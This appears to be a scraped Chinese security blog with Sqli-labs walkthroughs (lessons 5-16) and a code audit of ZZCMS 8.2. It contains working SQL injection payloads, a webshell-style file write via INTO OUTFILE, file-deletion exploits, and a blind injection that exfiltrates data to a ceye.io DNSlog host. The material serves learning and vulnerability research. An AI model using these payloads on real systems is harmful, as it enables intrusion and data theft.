    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/28/Sqli-labs Less7-16/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/28/Sqli-labs Less7-16/" itemprop="url">Sqli-labs Less7-16</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-28T08:15:41+08:00">
                2018-10-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>这里笔者是从测试的角度来练习的,通过fuzz猜测闭合符号—&gt;猜测sql语句—&gt;注入利用</p>
</blockquote>
<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7:"></a>less-7:</h2><p>访问第7关地址:<br>按照笔者的理解,sql注入的第一步是去想办法闭合语句,我们在平常挖洞的时候测试sql注入时,碰到<code>http://127.0.0.1:86/less-7/index.php?id=1</code>我们往往会加’测试,但是并不是所有的代码都会用单引号去包裹,我们需要更全面的去fuzz</p>
<p>这是我测试闭合符号的payload:<br>以less-7为例子:</p>
<pre><code>http://127.0.0.1:86/less-7/index.php?id=1    正确
http://127.0.0.1:86/less-7/index.php?id=1%23 正确
</code></pre><hr>
<p>fuzz的结果:</p>
<table>
<thead>
<tr>
<th>paylaod</th>
<th style="text-align:right">未加%23(#)</th>
<th style="text-align:right">加注释符(#)</th>
</tr>
</thead>
<tbody>
<tr>
<td>id=1</td>
<td style="text-align:right">正确</td>
<td style="text-align:right">正确</td>
</tr>
<tr>
<td>id=1’</td>
<td style="text-align:right">错误</td>
<td style="text-align:right">错误</td>
</tr>
<tr>
<td>id=1’)</td>
<td style="text-align:right">错误</td>
<td style="text-align:right">错误</td>
</tr>
<tr>
<td>id=1’))</td>
<td style="text-align:right">错误</td>
<td style="text-align:right">正确</td>
</tr>
<tr>
<td>id=1”</td>
<td style="text-align:right">正确</td>
<td style="text-align:right">正确</td>
</tr>
<tr>
<td>id=1”)</td>
<td style="text-align:right">正确</td>
<td style="text-align:right">正确</td>
</tr>
<tr>
<td>id=1”))</td>
<td style="text-align:right">正确</td>
<td style="text-align:right">正确</td>
</tr>
<tr>
<td>id=1)</td>
<td style="text-align:right">正确</td>
<td style="text-align:right">正确</td>
</tr>
<tr>
<td>id=1))</td>
<td style="text-align:right">正确</td>
<td style="text-align:right">正确</td>
</tr>
</tbody>
</table>
<blockquote>
<p>如果未加<code>%23(#)</code>显示错误而加上<code>%23(#)</code>显示正确即为闭合符号</p>
</blockquote>
<p>我们可看到加上<code>&#39;))</code>这3个字符去访问返回错误,但是在加上注释符(#)去访问就变回正常的了<br>所以我们就可以知道用<code>&#39;))</code>去闭合是正确的,当然这里为了更快速的测试,我把这些放入一个字典当中,用burp的intruder模块去爆破也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.12.10.46-image.png" alt="2018-10-29.12.10.46-image.png"><br>根据结果也可判断出<code>&#39;))</code>去闭合是正确的,接下来就是去正常的注入即可:</p>
<p>判断字段个数</p>
<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 3%23
http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 4%23
</code></pre><p>得到字段数为3,<br>使用<code>out_file</code>写入文件:</p>
<pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) union select 1,&apos;&lt;?php phpinfo();?&gt;&apos;,3 into outfile &apos;C:/web/WWW/sqli-labs-master/Less-7/shell.php&apos;%23
</code></pre><p>成功写入:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.17.28.55-image.png" alt="2018-10-28.17.28.55-image.png"></p>
<p>less-7的sql语句为:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;
</code></pre><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8:"></a>less-8:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.25.31-image.png" alt="2018-10-28.18.25.31-image.png"></p>
<p>是个<code>&#39;</code>闭合无疑了</p>
<p>因为这里正确页面包含<code>you are in</code> 错误页面无此字符串且没显示错误信息,那么这里我们只能使用盲注来获取信息,可参考笔者之前的文章:<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6</a> </p>
<p>less-8的sql语句为:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
</code></pre><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9:"></a>less-9:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.09.07-image.png" alt="2018-10-28.18.09.07-image.png"><br>同样为<code>&#39;</code><br>这里同样没有返回错误信息,再结合less-9的题目:<code>Blind-Time based</code>,我们可知道这里是要使用延时注入的,贴几条payload:</p>
<pre><code>?id=1&apos; and if((length(user())=14),sleep(5),1)%23 #当前用户长度为14
?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
?id=1&apos; and if((ascii(substr((select database()),1,1))=115)),sleep(3),1)%23   #数据库第一位是s(ascii码为115)
</code></pre><p>……..<br>猜解表与字段同理。</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.48-image.png" alt="2018-10-28.18.42.48-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.42.10-image.png" alt="2018-10-28.18.42.10-image.png"></p>
<p>less-9的sql语句为:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
</code></pre><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10:"></a>less-10:</h2><p>我们先利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.18.50.58-image.png" alt="xxxxx"></p>
<p><code>&quot;</code>闭合即可</p>
<p>与less-9同理,只需把payload的闭合符变为<code>&quot;</code>即可</p>
<p>less-10的sql语句为:</p>
<pre><code>$id = &apos;&quot;&apos;.$id.&apos;&quot;&apos;;
$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
</code></pre><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11:"></a>less-11:</h2><p>正确页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.06-image.png" alt="2018-10-28.20.51.06-image.png"></p>
<p>错误页面:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.51.43-image.png" alt="2018-10-28.20.51.43-image.png"></p>
<p>所以改变下intruder的过滤规则即可,利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.53.44-image.png" alt="2018-10-28.20.53.44-image.png"></p>
<p>我们得到 未加注释符(#)错误  加上注释符正确的符号 即为<code>&#39;</code></p>
<p>那么这里就开始POST注入:</p>
<pre><code>uname=xxxx&apos; order by 2%23&amp;passwd=admin&amp;submit=Submit    #得到字段数为2
uname=xxxx&apos; union select 1,2%23&amp;passwd=admin&amp;submit=Submit #得到显错位
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.03.08-image.png" alt="2018-10-28.21.03.08-image.png"></p>
<pre><code>#得到user:root@localhost database:security
uname=xxxx&apos; union select user(),database()%23&amp;passwd=admin&amp;submit=Submit 

#得到全部表名emails,referers,uagents,users
uname=xxxx&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),2%23&amp;passwd=admin&amp;submit=Submit  

#得到users表下的所有字段名 id,username,password
uname=xxxx&apos; union select (select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),2&amp;passwd=admin&amp;submit=Submit  

#得到security库下的users下的username,password内容
uname=xxxx&apos; union select (select group_concat(username,&apos;:&apos;,password) from security.users),2%23&amp;passwd=admin&amp;submit=Submit
</code></pre><p>less-11的sql语句为:</p>
<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
</code></pre><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12:"></a>less-12:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.25.38-image.png" alt="2018-10-28.21.25.38-image.png"></p>
<p>得到闭合符号为<code>&quot;)</code><br>然后把<code>less-11</code>的payload中的闭合符号<code>&#39;</code>变为<code>&quot;)</code>即可注入</p>
<p>less-12源代码:</p>
<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
</code></pre><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13:"></a>less-13:</h2><p>这里正确内容并不会像上面一样返回name及pwd,而会返回错误sql语句和是否登陆成功的信息,所以这里即可使用报错注入或盲注<br>盲注如下:<br>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.30.09-image.png" alt="2018-10-28.21.30.09-image.png"></p>
<p>得到闭合符号为<code>&#39;)</code></p>
<p>然后使用报错注入即可,这里列举几个payload:</p>
<pre><code>uname=admin&apos;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;passwd=admin&amp;submit=Submit
</code></pre><p>然后将select database()更换为其他查询语句即可得到数据</p>
<p>盲注参考less-5</p>
<p>less-13源代码:</p>
<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=(&apos;$uname&apos;) and password=(&apos;$passwd&apos;) LIMIT 0,1&quot;;
</code></pre><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14:"></a>less-14:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.53.31-image.png" alt="2018-10-28.21.53.31-image.png"></p>
<p>正确或错误返回内容与less-13一样 只是闭合符号变为了<code>&quot;</code></p>
<p>所以只需将less-13的payload中的闭合符<code>&#39;)</code>变为<code>&quot;</code>即可注入</p>
<p>less-14源代码:</p>
<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
@$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
</code></pre><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15:"></a>less-15:</h2><p>利用上面的方法得到正确的闭合符号:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.21.58.38-image.png" alt="2018-10-28.21.58.38-image.png"></p>
<p>所以闭合符号为<code>&#39;</code></p>
<p>正确错误不会返回错误信息,只是不同内容,所以这里用盲注即可   参考less-5即可<br>less-15源代码:</p>
<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
</code></pre><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16:"></a>less-16:</h2><p>利用上面的方法得到正确的闭合符号<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.22.02.01-image.png" alt="2018-10-28.22.02.01-image.png"></p>
<p>这里的情况与less-5相同,只是闭合符号<code>&#39;</code>变为<code>&quot;)</code></p>
<p>所以也可以用盲注,将闭合符换为<code>&quot;)</code>即可。</p>
<p>less-16源代码:</p>
<pre><code>$uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;;
$passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; 
@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;
</code></pre><hr>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/ZZCMSV8.2详细审计/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/25/ZZCMSV8.2详细审计/" itemprop="url">代码审计 | ZZCMSV8.2详细审计</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-25T08:15:41+08:00">
                2018-10-25
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>##<strong>1.安装时配置文件可写入命令导致Getshell</strong>(需要<code>magic_qupte_gpc</code>为<code>off</code>状态)<br>一般这种重装时出现的漏洞,需要配合其他漏洞才能发挥作用(如任意文件删除<code>lock</code>文件导致重装):<br>详情可看笔者发到ichunqiu的文章:<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44383&amp;page=1#pid500791" target="_blank" rel="noopener">ZZCMS 从任意文件删除至getshell</a></p>
<p>##<strong>2.多处任意文件删除:</strong><br>这是ZZCMS8.2关于文件操作部分的代码:</p>
<pre><code>A.
if ($oldimg&lt;&gt;$img){
        $f=&quot;../&quot;.$oldimg;
        if (file_exists($f)){
        unlink($f);        
        }
}


B.
if ($row[&apos;img&apos;]&lt;&gt;&quot;/image/nopic.gif&quot;){
        $f=&quot;../&quot;.substr($row[&apos;img&apos;],1);
        if (file_exists($f)){
        unlink($f);
        }
</code></pre><p>  在前台的文件删除最多的就是这两种删除情况,A代码没有对传入的<code>$oldimg</code>进行过滤导致任意文件删除,而B是从数据库提取<code>$row[&#39;img&#39;]</code>再进行删除,经测试,在该CMS中都会造成文件删除。这里只列出漏洞文件与漏洞利用条件,因为代码无外乎上面那两段。</p>
<p><strong>漏洞利用:</strong><br>A代码部分<br>1.<code>user\adv.php(modify与add方式都存在)</code>payload：</p>
<pre><code>127.0.0.1:81/user/adv.php?$action=modify
post:oldimg=install/install.lock
</code></pre><p>2.<code>licence_save.php(随意添加一个资质,得到id为1)</code>payload：</p>
<pre><code>http://127.0.0.1:81/user/licence_save.php?action=modify
post：oldimg=install/install.lock&amp;id=1
</code></pre><p>在实战中可以直接爆破得到id。<br>另外涉及的文件还有<code>user\manage.php</code>  <code>user\ppsave.php</code>  <code>user\zssave.php</code> <code>ztconfig.php</code></p>
<p>B代码部分<br>与A的利用方式不同的是,他这里的<code>$row[&#39;img&#39;]</code>是从数据库中提取的,那我们要利用这里进行文件删除的话就需要先把脏数据(要删除的文件)写入数据库,然后再去删除。</p>
<p>我这里也找到几处存在问题的地方：<br>1.<code>user\del.php:</code><br><img src="http://static.zybuluo.com/chhyx/mrzy5zfl10c4uulo7yitzvht/image_1cqipr8rc1tro19ucr1aql41i1p87.png" alt="image_1cqipr8rc1tro19ucr1aql41i1p87.png-99.5kB"></p>
<p>那我们就需要找一下在哪里可以插入或者修改zzcms_main表中的img字段值的地方:<br>在<code>user\zssave.php</code>中找见:<br><img src="http://static.zybuluo.com/chhyx/p19ih7qu5a3h93k4e9zqmrp0/image_1cqipskup1f3i13hmmbp1tcc1om48k.png" alt="image_1cqipskup1f3i13hmmbp1tcc1om48k.png-57.4kB"></p>
<p>那利用就很简单了:<br>先访问:<code>http://127.0.0.1:81/user/zssave.php</code><br>添加时将<code>$img</code>值(或<code>$flv</code>)改为想删除的文件<code>xinstall/install.lock</code>(从下标为1开始取值)<br>然后再访问:</p>
<pre><code>http://127.0.0.1:81/user/del.php   
post:id=1&amp;tablename=zzcms_main
</code></pre><p>即可成功删除<code>install.lock</code>文件,这里的<code>id</code>同样需要爆破</p>
<p>在<code>user\del.php</code>这个文件下另外一处:</p>
<p><img src="http://static.zybuluo.com/chhyx/2br5zkprbcxioqp7w223w9h1/image_1cqip94rk1hrtkj2q7u19ud12r63d.png" alt="image_1cqip94rk1hrtkj2q7u19ud12r63d.png-69.5kB"></p>
<p>在<code>licence_sace.php</code>有往<code>zzcms_licence</code>表写数据的操作<br><img src="http://static.zybuluo.com/chhyx/skavh97q5jwknwnxeybg8p5y/image_1cqipe3aq3iavumtf215i777g6q.png" alt="image_1cqipe3aq3iavumtf215i777g6q.png-118.8kB"><br>操作同上即可利用。</p>
<p>##<strong>3.多处Sql注入:</strong><br><strong>A.HTTP_CLIENT_IP 注入</strong><br>获取ip的函数<code>getip()</code>无过滤,与笔者前几天分析的<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">代码审计 | APPCMS详细审计</a>中的注入类似。</p>
<pre><code>#inc\function.php    getip()
function getip(){ 
if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) 
$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); 
else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) 
$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); 
else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) 
$ip = getenv(&quot;REMOTE_ADDR&quot;); 
else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) 
$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; 
else 
$ip = &quot;unknown&quot;; 
return ($ip); 
} 
</code></pre><p>然后直接搜索用到<code>getip()</code>函数的地方进行利用。</p>
<pre><code>user\logincheck.php
</code></pre><p><img src="http://static.zybuluo.com/chhyx/syx67osq7fldj7gt1kzbasgk/image_1cqir6v841j0be6219ru1gheu259e.png" alt="image_1cqir6v841j0be6219ru1gheu259e.png-131.4kB"></p>
<p>因为这里时无回显的盲注,我们用DNSlog来快速获取数据,<br>不清楚怎么使用的可参考笔者之前的文章。</p>
<pre><code>client-ip: 1.1.1.1&apos; and ((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxxxx.ceye.io\\abc&apos;))))#
</code></pre><p><img src="http://static.zybuluo.com/chhyx/9gyfrk1tgqc2p1dac1e5hea8/image_1cqis1ttj13t7uibddvstn1kbb9r.png" alt="image_1cqis1ttj13t7uibddvstn1kbb9r.png-104.1kB"></p>
<p>剩下的还有几处利用点,但大多类似,就不再赘述。</p>
<p><strong>B.$tablename注入</strong><br>将传入的变量<code>$tablename</code>直接拼接到sql语句中,且无引号包裹,<br><img src="http://static.zybuluo.com/chhyx/25nmbl349o2copgl8mym97tv/image_1cqkek8v7b68ib12kb1k691kjq9.png" alt="image_1cqkek8v7b68ib12kb1k691kjq9.png-18.1kB"></p>
<p>因为这里并无回显,所以只能利用延时注入或者dnslog带入的方式</p>
<pre><code>http://127.0.0.1:81/user/del.php
post:id=2&amp;tablename=zzcms_licence+where+title=100+or+if(1,sleep(2),1)--+
</code></pre><p>与上面<code>getip()</code>类似。</p>
<p><strong>C.stripfxg使用错误导致注入</strong><br>在该CMS中还有个危险函数<code>stripfxg()</code>,他的作用就是将已经过滤的数据还原:<br><img src="http://static.zybuluo.com/chhyx/btb1zj08yl388ipts0od8uiu/image_1cqkd93hvihq1usv1spa10ti1iuf2g.png" alt="image_1cqkd93hvihq1usv1spa10ti1iuf2g.png-51.3kB"></p>
<p>是个危险函数无疑了。搜索调用该函数且带入数据库的地方,找到一处<code>user\msg.php</code>:<br><img src="http://static.zybuluo.com/chhyx/v42tg9owuqsbrtm39wfm3din/image_1cqkct38o1ckp1qo819809l9323.png" alt="image_1cqkct38o1ckp1qo819809l9323.png-123.8kB"></p>
<p>这里是<code>insert</code>注入,我们可以利用多伪造一组数据的方法,<br>与<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/21/APPCMS详细审计/</a>同理：</p>
<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
POST:info_content=xxxxxxx&apos;),((select user()))#&amp;Submit=%E6%8F%90%E4%BA%A4
</code></pre><p><img src="http://static.zybuluo.com/chhyx/vrxf7778iix0qri6wn4mpgbv/image_1cqke5u0k1fq4l037v810pq13h13d.png" alt="image_1cqke5u0k1fq4l037v810pq13h13d.png-137.1kB"></p>
<p>还有就是可利用延时注入:</p>
<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
POST:info_content=xxxxxxx&apos;^if(1,sleep(6),0))#&amp;Submit=%E6%8F%90%E4%BA%A4
</code></pre><p><img src="http://static.zybuluo.com/chhyx/6p3jpkqie8rwnebvjw7veupg/image_1cqkclcimhv21lko1m8l11jtcrfm.png" alt="image_1cqkclcimhv21lko1m8l11jtcrfm.png-140.5kB"></p>
<p>注入小技巧:</p>
<pre><code>在碰到insert注入和update注入的时候,除了能够多伪造一组数据以外，还可以使用这种异或符号加上sleep函数来延时注入

insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
</code></pre><p><img src="http://static.zybuluo.com/chhyx/buipbf0dwmbusowquxf0yxmc/image_1cqkccjja1es612ksqkvs3j9pd9.png" alt="image_1cqkccjja1es612ksqkvs3j9pd9.png-10.7kB"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" itemprop="url">Sqli-labs Blind injection Less5-6</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T08:15:41+08:00">
                2018-10-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。</p>
</blockquote>
<hr>
<p>##<strong>MID(源字符串,开始位置,截取长度)</strong><br>    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>MID(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位，<code>MID(DATABASE(),2,1)</code>查看数据库名第二位，依次查看各位字符。</p>
<p>B.<code>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<p>##<strong>substr(源字符串,开始位置,截取长度)</strong><br>substr与mid substring的用法类似<br>str = ‘123456’  substr(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>substr(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>MID(DATABASE(),2,1)</code>查看数据库名第二位,依次查看各位字符。</p>
<p>B.<code>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<p>##<strong>left(源字符串,截取长度)</strong><br>left得到字符串从左开始指定个数的字符串<br>str = ‘123456’  left(str,3) 结果为123<br><strong>SQL用例</strong>：<br>A.<code>left(database(),1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>left(database(),2)&gt;&#39;ab&#39;</code>,查看数据库名前二位。</p>
<p>B.<code>left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<hr>
<p>再介绍一<code>下ascii()</code>与<code>ord()</code>函数,这两个函数经常与上面的截取函数连用。<br>因为mysql默认是不对大小写敏感的,所以为了保证结果准确,我们就需要将字符转为其对应的ascii码值进行比较</p>
<p>用法:<code>ASCII(str1) ord(str1)</code> 都是返回字符串的第一个字符的ASCII码值</p>
<p><strong>SQL用例</strong>：</p>
<pre><code>猜解数据库名第一位的ascii码值是否为97 (即字符a)
ascii(substr(database(),1,1))=97 
ord(mid(database(),1,1))=97  
</code></pre><p>##<strong>Less-5:</strong><br>经过简单查看页面,这里的正确界面并不会返回用户名与密码,而是返回字符串<code>You are in.....</code><br><img src="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png" alt="image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png-206.3kB"></p>
<p>加单引号看报错信息:<br><img src="http://static.zybuluo.com/chhyx/1c8lqewwtouvcupqlga4at3v/image_1cqdfu64t2avelb1ugdlh61ssca9.png" alt="image_1cqdfu64t2avelb1ugdlh61ssca9.png-212.9kB"></p>
<p>我们可以看到我们提交的1’经过sql语句处理变成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1</code> 所以我们可以猜测后台代码是这样写的:<code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;</code><br>这里我们就需要闭合掉单引号</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=1--+
http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=2--+
</code></pre><p>这里正确会返回You are in…… 错误返回空</p>
<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
<p>猜解数据库长度:</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;7--+
http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;8--+
</code></pre><p>说明数据库长度为8</p>
<p>猜解数据库名:</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and ascii(substr((database()),1,1))=115--+
</code></pre><p>这里用burp简单测试一下,发现<code>ascii码</code>值为115返回正确页面, 猜解出第一位为s<br><img src="http://static.zybuluo.com/chhyx/2887km8ounik96ogys2wymx9/image_1cqfqlru4kvm10nj4vh16sl17c19.png" alt="image_1cqfqlru4kvm10nj4vh16sl17c19.png-63.9kB"><br>改变<code>substr</code>的第二个参数,至到数据库名全部猜解。（security）</p>
<p>猜解数据表数量:</p>
<pre><code>&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)=4--+
</code></pre><p>得到security数据库共有4张表<br>猜解每个表的长度:</p>
<pre><code>&apos; and length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))=6--+
</code></pre><p>猜解数据表名:</p>
<pre><code>&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=97--+
</code></pre><p>猜解列个数:</p>
